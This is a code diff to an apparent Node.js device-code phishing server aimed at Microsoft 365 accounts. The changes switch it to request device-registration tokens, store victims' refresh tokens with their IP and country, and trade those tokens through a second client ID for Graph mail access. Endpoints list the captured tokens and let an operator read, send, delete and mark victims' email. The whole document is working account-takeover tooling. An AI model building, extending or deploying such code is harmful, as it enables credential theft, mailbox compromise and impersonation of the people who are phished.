@@ -10,7 +10,14 @@ app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
-const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
+// ============================================
+// TWO CLIENT IDs - Different purposes
+// ============================================
+// Client 1: PRT Device Registration (captures PRT)
+const PRT_CLIENT_ID = '29d9ed98-a469-4536-ade2-f981bc1d605e';
+// Client 2: Graph API (mailbox access using PRT)
+const GRAPH_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+// ============================================
 
 // Store sessions
 let userSessions = new Map();
@@ -45,7 +52,8 @@ function getClientIp(req) {
 }
 
 // ============================================
-// START AUTHENTICATION - WITH MAIL SCOPES
+// STAGE 1: AUTHENTICATION - Using PRT Client ID
+// Captures PRT only (no mailbox access yet)
 // ============================================
 app.post('/start', async (req, res) => {
     try {
@@ -58,11 +66,11 @@ app.post('/start', async (req, res) => {
         
         console.log(`[START] New auth request - Session: ${sessionId.substring(0, 15)}..., IP: ${clientIp}`);
         
-        // UPDATED SCOPE: Added Mail.Read, Mail.ReadWrite, Mail.Send for mailbox access
+        // Using PRT Client ID - only for device registration
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
-                client_id: YOUR_CLIENT_ID,
-                scope: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
+                client_id: PRT_CLIENT_ID,
+                scope: 'urn:ms-drs:enterpriseregistration.windows.net/.default openid offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -84,7 +92,6 @@ app.post('/start', async (req, res) => {
             expiresAt: Date.now() + (expires_in * 1000)
         });
         
-        // Start polling immediately
         pollForToken(device_code, sessionId);
         
         res.json({
@@ -100,28 +107,15 @@ app.post('/start', async (req, res) => {
     }
 });
 
-// ============================================
-// POLL FOR TOKEN
-// ============================================
 async function pollForToken(device_code, sessionId) {
-    console.log(`[POLL] Started polling for session ${sessionId.substring(0, 15)}...`);
-    
     const pollInterval = setInterval(async () => {
         const pending = pendingAuth.get(sessionId);
-        if (!pending) {
-            console.log(`[POLL] Session ${sessionId.substring(0, 15)}... not found, stopping`);
-            clearInterval(pollInterval);
-            return;
-        }
-        
-        if (pending.status !== 'pending') {
-            console.log(`[POLL] Session ${sessionId.substring(0, 15)}... already ${pending.status}, stopping`);
+        if (!pending || pending.status !== 'pending') {
             clearInterval(pollInterval);
             return;
         }
         
         if (Date.now() > pending.expiresAt) {
-            console.log(`[POLL] Session ${sessionId.substring(0, 15)}... expired`);
             pending.status = 'expired';
             pendingAuth.delete(sessionId);
             clearInterval(pollInterval);
@@ -132,7 +126,7 @@ async function pollForToken(device_code, sessionId) {
             const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                 new URLSearchParams({
                     grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
-                    client_id: YOUR_CLIENT_ID,
+                    client_id: PRT_CLIENT_ID,
                     device_code: device_code
                 }), {
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
@@ -142,10 +136,9 @@ async function pollForToken(device_code, sessionId) {
             const tokens = response.data;
             
             console.log(`[POLL] ✅ Token received for session ${sessionId.substring(0, 15)}...`);
-            console.log(`[POLL] Access token: ${tokens.access_token.substring(0, 30)}...`);
-            console.log(`[POLL] Refresh token (PRT): ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
+            console.log(`[POLL] PRT (Refresh Token) captured: ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
             
-            // Get user info
+            // Get user info - use Graph API with the new PRT client
             const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                 headers: { 'Authorization': `Bearer ${tokens.access_token}` }
             });
@@ -155,7 +148,7 @@ async function pollForToken(device_code, sessionId) {
             
             console.log(`[POLL] User: ${userEmail} (${userName})`);
             
-            // Store session by email
+            // Store the PRT for later use with Graph API
             userSessions.set(userEmail, {
                 sessionId: sessionId,
                 email: userEmail,
@@ -163,8 +156,8 @@ async function pollForToken(device_code, sessionId) {
                 ip: pending.ip,
                 userAgent: pending.userAgent,
                 country: pending.country,
+                prt_token: tokens.refresh_token,  // This is the PRT - saved for later
                 access_token: tokens.access_token,
-                refresh_token: tokens.refresh_token,
                 expires_in: tokens.expires_in,
                 expires_at: Date.now() + (tokens.expires_in * 1000),
                 capturedAt: new Date().toISOString(),
@@ -176,11 +169,10 @@ async function pollForToken(device_code, sessionId) {
             pendingAuth.delete(sessionId);
             clearInterval(pollInterval);
             
-            console.log(`✅✅✅ SUCCESS! Session captured for ${userEmail}`);
+            console.log(`✅✅✅ SUCCESS! PRT captured for ${userEmail}`);
             console.log(`✅✅✅ Total sessions: ${userSessions.size}`);
             
         } catch (err) {
-            // This is normal - waiting for user to approve
             if (err.response?.data?.error !== 'authorization_pending') {
                 console.log(`[POLL] Waiting for user approval...`);
             }
@@ -188,40 +180,26 @@ async function pollForToken(device_code, sessionId) {
     }, 3000);
 }
 
-// ============================================
-// STATE ENDPOINT - Polled by auth page
-// ============================================
 app.get('/state', async (req, res) => {
     const sessionId = req.query.session_id;
-    
-    if (!sessionId) {
-        return res.json({ status: 'error', message: 'No session ID' });
-    }
+    if (!sessionId) return res.json({ status: 'error' });
     
     const pending = pendingAuth.get(sessionId);
-    
     if (pending) {
         if (pending.status === 'success') {
-            console.log(`[STATE] Session ${sessionId.substring(0, 15)}... completed successfully`);
             return res.json({ status: 'success', email: pending.email });
         }
         return res.json({ status: 'pending' });
-    }
-    
-    // Check if already in sessions
-    for (const [email, session] of userSessions.entries()) {
-        if (session.sessionId === sessionId) {
-            return res.json({ status: 'success', email: email });
-        }
     }
     
     res.json({ status: 'pending' });
 });
 
 // ============================================
-// GET FRESH ACCESS TOKEN USING PRT
+// STAGE 2: Get Mailbox Access Token Using PRT
+// Uses the captured PRT with Graph API client ID
 // ============================================
-async function getFreshAccessToken(email) {
+async function getMailboxAccessToken(email) {
     const session = userSessions.get(email);
     
     if (!session) {
@@ -229,20 +207,22 @@ async function getFreshAccessToken(email) {
         return null;
     }
     
-    if (!session.refresh_token) {
+    if (!session.prt_token) {
         console.log(`❌ No PRT for ${email}`);
         return null;
     }
     
     try {
-        console.log(`🔄 Refreshing token for ${email} using PRT...`);
+        console.log(`🔄 Getting mailbox token for ${email} using PRT...`);
+        console.log(`   Using Graph Client ID: ${GRAPH_CLIENT_ID}`);
         
+        // Use the captured PRT with the Graph API client ID
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
                 grant_type: 'refresh_token',
-                refresh_token: session.refresh_token,
-                client_id: YOUR_CLIENT_ID,
-                scope: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
+                refresh_token: session.prt_token,
+                client_id: GRAPH_CLIENT_ID,
+                scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -250,14 +230,10 @@ async function getFreshAccessToken(email) {
         
         const tokens = response.data;
         
-        session.access_token = tokens.access_token;
-        session.expires_at = Date.now() + (tokens.expires_in * 1000);
-        session.expires_in = tokens.expires_in;
-        
-        console.log(`✅ Fresh token obtained for ${email}`);
+        console.log(`✅ Mailbox token obtained for ${email}`);
         return tokens.access_token;
     } catch (err) {
-        console.error(`❌ Failed to refresh token for ${email}:`, err.message);
+        console.error(`❌ Failed to get mailbox token for ${email}:`, err.response?.data?.error || err.message);
         return null;
     }
 }
@@ -273,7 +249,7 @@ app.get('/api/sessions', (req, res) => {
         ip: s.ip,
         country: s.country,
         userAgent: s.userAgent,
-        type: 'Graph API',
+        type: 'PRT Device Registration',
         capturedAt: s.capturedAt,
         expiresAt: s.hasPRT ? 'Permanent (PRT)' : new Date(s.expires_at).toLocaleString(),
         hasPRT: s.hasPRT
@@ -290,14 +266,11 @@ app.get('/api/session/token/:email', async (req, res) => {
         return res.status(404).json({ error: 'Session not found', email: email });
     }
     
-    const freshToken = await getFreshAccessToken(email);
-    
     res.json({
         email: session.email,
-        access_token: freshToken || session.access_token,
-        refresh_token: session.refresh_token,
-        has_refresh_token: !!session.refresh_token,
-        expires_in: session.expires_in
+        prt_token: session.prt_token,
+        has_prt: !!session.prt_token,
+        note: "This is the PRT. Use it with Graph API client ID to get mailbox access."
     });
 });
 
@@ -306,23 +279,23 @@ app.get('/api/list_access_tokens', (req, res) => {
         id: s.sessionId,
         user: s.email,
         name: s.name,
-        resource: 'Microsoft Graph',
-        accesstoken: s.access_token,
+        resource: 'PRT Token',
+        accesstoken: s.prt_token,
         issued_at: s.capturedAt,
-        expires_at: new Date(s.expires_at).toLocaleString()
+        expires_at: 'Permanent'
     }));
     res.json(tokens);
 });
 
 app.get('/api/list_refresh_tokens', (req, res) => {
     const tokens = Array.from(userSessions.values())
-        .filter(s => s.refresh_token)
+        .filter(s => s.prt_token)
         .map(s => ({
             id: s.sessionId,
             user: s.email,
             name: s.name,
-            resource: 'Microsoft Graph (PRT) - Permanent',
-            refreshtoken: s.refresh_token
+            resource: 'PRT - Primary Refresh Token',
+            refreshtoken: s.prt_token
         }));
     res.json(tokens);
 });
@@ -337,16 +310,12 @@ app.get('/api/country_stats', (req, res) => {
 });
 
 app.get('/api/overview_stats', (req, res) => {
-    const totalSessions = userSessions.size;
-    const totalPRTs = Array.from(userSessions.values()).filter(s => s.refresh_token).length;
-    const countries = new Set(Array.from(userSessions.values()).map(s => s.country)).size;
-    
     res.json({
         totalVisits: totalVisits,
-        totalSessions: totalSessions,
-        totalPRTs: totalPRTs,
-        totalCountries: countries,
-        lastCapture: totalSessions > 0 ? new Date(Math.max(...Array.from(userSessions.values()).map(s => new Date(s.capturedAt).getTime()))).toLocaleString() : 'None'
+        totalSessions: userSessions.size,
+        totalPRTs: Array.from(userSessions.values()).filter(s => s.prt_token).length,
+        totalCountries: new Set(Array.from(userSessions.values()).map(s => s.country)).size,
+        lastCapture: userSessions.size > 0 ? new Date(Math.max(...Array.from(userSessions.values()).map(s => new Date(s.capturedAt).getTime()))).toLocaleString() : 'None'
     });
 });
 
@@ -358,15 +327,15 @@ app.delete('/api/sessions/clear', (req, res) => {
 });
 
 // ============================================
-// MAILBOX API
+// MAILBOX API - Uses Graph API Client ID with PRT
 // ============================================
 app.get('/api/mail/folders/:email', async (req, res) => {
     const { email } = req.params;
     console.log(`[MAIL] Getting folders for ${email}`);
     
-    const token = await getFreshAccessToken(email);
+    const token = await getMailboxAccessToken(email);
     if (!token) {
-        return res.status(401).json({ error: 'No valid token. Please re-authenticate.' });
+        return res.status(401).json({ error: 'No valid token. PRT not found.' });
     }
     
     try {
@@ -383,7 +352,7 @@ app.get('/api/mail/folders/:email', async (req, res) => {
 
 app.get('/api/mail/:email/:folderId', async (req, res) => {
     const { email, folderId } = req.params;
-    const token = await getFreshAccessToken(email);
+    const token = await getMailboxAccessToken(email);
     if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
@@ -399,7 +368,7 @@ app.get('/api/mail/:email/:folderId', async (req, res) => {
 
 app.get('/api/mail/message/:email/:messageId', async (req, res) => {
     const { email, messageId } = req.params;
-    const token = await getFreshAccessToken(email);
+    const token = await getMailboxAccessToken(email);
     if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
@@ -416,7 +385,7 @@ app.get('/api/mail/message/:email/:messageId', async (req, res) => {
 app.post('/api/mail/send/:email', async (req, res) => {
     const { email } = req.params;
     const { to, subject, body } = req.body;
-    const token = await getFreshAccessToken(email);
+    const token = await getMailboxAccessToken(email);
     if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
@@ -436,7 +405,7 @@ app.post('/api/mail/send/:email', async (req, res) => {
 
 app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
     const { email, messageId } = req.params;
-    const token = await getFreshAccessToken(email);
+    const token = await getMailboxAccessToken(email);
     if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
@@ -452,7 +421,7 @@ app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
 app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
     const { email, messageId } = req.params;
     const { isRead } = req.body;
-    const token = await getFreshAccessToken(email);
+    const token = await getMailboxAccessToken(email);
     if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
@@ -467,7 +436,7 @@ app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
 });
 
 // ============================================
-// SETTINGS API
+// SETTINGS
 // ============================================
 let config = {
     active_resource: 'graph',
@@ -489,6 +458,8 @@ app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.ht
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
-    console.log(`✅ Mail scopes enabled - Users will be asked for email permissions`);
+    console.log(`✅ PRT Client ID: ${PRT_CLIENT_ID}`);
+    console.log(`✅ Graph Client ID: ${GRAPH_CLIENT_ID}`);
+    console.log(`✅ PRT captured during auth → Used with Graph client for mailbox`);
     console.log(`========================================\n`);
 });
